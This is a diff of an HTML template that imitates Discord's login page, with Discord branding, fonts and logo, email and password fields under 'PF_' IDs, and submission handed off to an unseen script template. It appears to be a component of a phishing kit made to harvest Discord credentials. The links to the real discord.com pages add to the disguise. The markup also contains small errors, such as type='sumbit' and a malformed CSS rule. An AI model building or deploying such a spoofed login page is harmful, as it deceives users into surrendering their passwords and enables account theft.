@@ -1,43 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title></title>
+    <title>Discord</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="/static/images/discord.ico">
+    <link rel="icon" type="image/x-icon" href="{{.static}}/images/discord.ico">
   </head>
   <body>
-    <main>
+    <img src="{{.static}}/images/discord_bg.svg" class="background">
+    <img src="{{.static}}/images/discord_logo.svg" class="logo">
+    <form action="javascript:void(0);" id="PF_form">
       <h1>Welcome back!</h1>
       <label class="header2">We're so excited too see you again!</label>
       <div>
         <label class="inptext">email or phone number <red>*</red></label>
-        <input id="user" type="text">
+        <input id="PF_user" type="text" required>
       </div>
       <div>
         <label class="inptext">password <red>*</red></label>
-        <input id="pass" type="password">
+        <input id="PF_pass" type="password" required>
         <a href="https://discord.com/login">Forgot your password?</a>
       </div> 
-      <button id="submit">Log In</button>
+      <button type="sumbit">Log In</button>
       <p>Need an account? <a href="https://discord.com/register">Register</a></p>
-    </main>
-    <script type="module" src="/static/script.js"></script>
+    </form>
+    {{template "parts/script" .}}
   </body>
   <style>
     @font-face {
       font-family: dcthin;
-      src: url(/static/fonts/discordfont0.woff2);
+      src: url("{{.static}}/fonts/discordfont0.woff2");
     }
 
     @font-face {
       font-family: dcbold;
-      src: url(/static/fonts/discordfont1.woff2);
+      src: url("{{.static}}/fonts/discordfont1.woff2");
     }
     
     @font-face {
       font-family: dcmed;
-      src: url(/static/fonts/discordfont2.woff2);
+      src: url("{{.static}}/fonts/discordfont2.woff2");
     }
     
     *{
@@ -47,11 +49,7 @@
       user-select: none;
     }
 
-    body{
-      background: url("/static/images/discord.jpg");
-    }
-
-    main{
+    form{
       display: flex;
       flex-direction: column;
       position: absolute;
@@ -59,6 +57,7 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
+      background: color-mix( in oklab, (hsl(223 calc(var(--saturation-factor, 1) * 6.7%) 20.6%;)/1) 100%);
       background: #282d30;
       padding: 30px;
       width: 500px;
@@ -71,6 +70,20 @@
       font-size: 24px;
       margin-bottom: 8px;
       font-family: dcmed;
+    }
+
+    .logo {
+      position: relative;
+      top: 48px;
+      left: 48px;
+    }
+
+    .background {
+      position: fixed;
+      top: 0px;
+      left: 0px;
+      width: 100%;
+      height: 100%;
     }
 
     .header2{
@@ -157,6 +170,5 @@
       line-height: 16px;
       color: hsl(223 calc(1*5.8%) 52.9%/1);
     }
-
   </style>
 </html>
